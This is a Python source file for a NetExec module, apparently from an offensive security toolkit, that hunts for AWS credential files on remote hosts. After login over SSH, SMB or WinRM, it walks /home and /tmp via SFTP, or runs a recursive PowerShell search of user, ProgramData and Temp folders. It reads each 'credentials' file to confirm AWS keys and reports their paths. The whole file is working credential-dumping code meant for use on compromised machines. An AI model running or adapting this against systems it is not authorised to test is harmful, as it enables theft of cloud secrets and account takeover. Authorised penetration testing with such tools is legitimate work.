import json
import posixpath
import shlex
import stat
from dataclasses import dataclass, field

from nxc.helpers.misc import CATEGORY
from nxc.playbooks.results import ActionResult, ResultStatus


class NXCModule:
    """Search for AWS credential files. Module by Fortress."""

    name = "aws-credentials"
    description = "Search for aws credentials files."
    supported_protocols = ["ssh", "smb", "winrm"]
    category = CATEGORY.CREDENTIAL_DUMPING

    @dataclass
    class ResultData:
        source: str
        search_path: str
        paths: list[str] = field(default_factory=list)
        output: str | bytes | None = None

    result_type = ResultData

    def options(self, context, module_options):
        r"""
        SEARCH_PATH_LINUX    Shell-quoted Linux search roots (default: '/home/' '/tmp/')
        SEARCH_PATH_WIN      PowerShell search paths (default: 'C:\Users\', 'C:\ProgramData\AWSCLI\', 'C:\Temp\')
        """
        self.search_path_linux = module_options.get("SEARCH_PATH_LINUX", "'/home/' '/tmp/'")
        self.search_path_win = module_options.get("SEARCH_PATH_WIN", "'C:\\Users\\', 'C:\\ProgramData\\AWSCLI\\', 'C:\\Temp\\'")

    def on_login(self, context, connection):
        protocol = connection.args.protocol
        data = self.ResultData("sftp" if protocol == "ssh" else "powershell", self.search_path_linux if protocol == "ssh" else self.search_path_win)
        errors = []
        try:
            if protocol == "ssh":
                self.find_sftp(connection, data, errors)
            else:
                payload = "$lookupErrors=@(); $paths=@(Get-ChildItem -Path " + self.search_path_win + " -File -Recurse -Force -Include 'credentials' -ErrorAction SilentlyContinue -ErrorVariable +lookupErrors | Where-Object { Select-String -LiteralPath $_.FullName -Pattern 'aws' -Quiet -ErrorAction SilentlyContinue -ErrorVariable +lookupErrors } | Select-Object -ExpandProperty FullName); @{paths=$paths;errors=@($lookupErrors | ForEach-Object {$_.ToString()})} | ConvertTo-Json -Compress -Depth 5"
                data.output = connection.execute(f'powershell.exe -NoProfile -Command "{payload}"', True)
                parsed = json.loads(data.output)
                if not isinstance(parsed, dict) or not isinstance(parsed.get("paths"), list) or not isinstance(parsed.get("errors"), list):
                    raise ValueError("AWS file search returned an invalid result envelope")
                if any(not isinstance(path, str) for path in parsed["paths"]):
                    raise ValueError("AWS file search returned a non-path record")
                data.paths = list(dict.fromkeys(parsed["paths"]))
                errors.extend(str(error) for error in parsed["errors"])
            for path in data.paths:
                context.log.highlight(path)
        except Exception as e:
            errors.append(str(e) or type(e).__name__)
        for error in errors:
            context.log.fail(error)
        return ActionResult(protocol, self.name, connection.host, ResultStatus.FAILED if errors else ResultStatus.SUCCESS if data.paths else ResultStatus.NEGATIVE, data, error="; ".join(errors) or None)

    def find_sftp(self, connection, data, errors):
        sftp = None
        path = None
        try:
            roots = shlex.split(self.search_path_linux)
            if not roots:
                raise ValueError("No Linux search roots supplied")
            sftp = connection.conn.open_sftp()
            pending = list(reversed(roots))
            seen = set()
            while pending:
                path = posixpath.normpath(pending.pop())
                if path in seen:
                    continue
                seen.add(path)
                try:
                    attributes = sftp.lstat(path)
                except FileNotFoundError:
                    continue
                if stat.S_ISDIR(attributes.st_mode):
                    pending.extend(posixpath.join(path, entry.filename) for entry in reversed(sftp.listdir_attr(path)) if entry.filename not in (".", ".."))
                elif stat.S_ISREG(attributes.st_mode) and posixpath.basename(path) == "credentials":
                    with sftp.open(path, "rb") as stream:
                        if b"aws_" in stream.read():
                            data.paths.append(path)
        except Exception as e:
            errors.append(f"{path or 'SFTP search'}: {str(e) or type(e).__name__}")
        finally:
            if sftp is not None:
                try:
                    sftp.close()
                except Exception as e:
                    errors.append(f"Closing SFTP search: {e}")
